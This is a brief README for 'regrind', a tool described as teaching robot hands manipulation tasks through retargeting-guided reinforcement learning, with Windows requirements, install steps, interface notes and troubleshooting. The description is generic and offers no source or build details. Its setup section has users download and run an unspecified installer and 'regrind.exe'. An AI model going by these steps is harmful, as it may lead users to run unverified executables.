💡 About This Project

regrind provides a simple approach to teaching robotic systems how to perform complex tasks. By using retargeting-guided reinforcement learning, the software maps human hand movements to robotic manipulators. This allows the system to learn efficient movement patterns without the need for manual programming of every joint. The tool focuses on dexterous manipulation, which is the ability to grasp, rotate, and interact with objects in a realistic environment.

⚙️ System Requirements

  • Windows 10 or Windows 11 (64-bit).
  • 8 GB of system memory (RAM).
  • An NVIDIA graphics card.
  • 5 GB of free disk space.
  • Updated graphics card drivers.

🚀 Getting Started

Follow these steps to set up the software on your computer.

  1. Visit the project page to access the setup files: Download the latest version here.
  2. Locate the downloaded file in your Downloads folder.
  3. Double-click the installer file to begin the setup process.
  4. Follow the on-screen instructions to extract the files to your preferred location.
  5. Open the folder and locate the execution file named "regrind.exe".
  6. Double-click "regrind.exe" to launch the main interface.

🛠 Using the Interface

The interface allows you to select your desired manipulation task from a library of templates. Once you load a task, the software connects to the simulation engine. You can adjust the training speed using the slider located on the main dashboard. The view window displays the robot hand as it learns to manipulate the object. You may stop or restart the training at any time using the control buttons at the bottom of the screen.

The application logs all training progress automatically. These logs appear in a text window, showing the success rates and current phase of learning. If you wish to save your progress, select the "Export Model" option from the file menu. This saves the current learning state for future use.

💡 Troubleshooting

If the application closes unexpectedly, ensure that your graphics drivers are current. You can check for updates via the settings menu of your graphics card software. If you encounter missing file errors, try running the installer again and select the "Repair" option. Always ensure that the folder containing the software has write permissions, as the program needs to save training logs during operation. For performance issues, close other heavy applications while you run the simulation.
